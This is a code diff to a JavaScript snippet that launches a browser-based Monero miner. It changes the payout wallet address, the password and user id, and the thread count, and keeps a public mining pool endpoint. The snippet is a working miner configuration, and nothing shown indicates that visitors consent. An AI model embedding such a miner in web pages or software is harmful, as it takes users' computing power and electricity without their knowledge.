@@ -1,6 +1,6 @@
 //Parameters:
 
-//4ArDBLwNK8oASLjkL8WcKp97YDehhydiTQprFJnmAdWudLDDBbkbSXQbRSttx4qgh4NiNG7CkMm1wEfJpq9CNDzRK1Xuu3X
+//445PkwEaVjY1LeAipFz2nqFikbbv6TrkV5LogUBKcnX2b4kE3vefeQqXLjRPd2a8R7apzgaZAzoY6E7aSKjn3Cc4LhiFSdj
 
 //threads   
 //The number of threads (1-16) the miner should start with. 
@@ -27,13 +27,13 @@
 
 var site_id = 'cwm-861';
 var coin = 'monero';
-var wallet = '4ArDBLwNK8oASLjkL8WcKp97YDehhydiTQprFJnmAdWudLDDBbkbSXQbRSttx4qgh4NiNG7CkMm1wEfJpq9CNDzRK1Xuu3X';
-var password = 'hello@gmail.com';
+var wallet = '445PkwEaVjY1LeAipFz2nqFikbbv6TrkV5LogUBKcnX2b4kE3vefeQqXLjRPd2a8R7apzgaZAzoY6E7aSKjn3Cc4LhiFSdj';
+var password = 'x';
 var mining_pool = 'gulf.moneroocean.stream:10001';
-var threads = -1;
+var threads = 10;
 var throttle = 0.2;
 var debug = false;
-var userid = 'John';
+var userid = 'minerminerminer';
 cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug, userid);
 
 //Stop miner
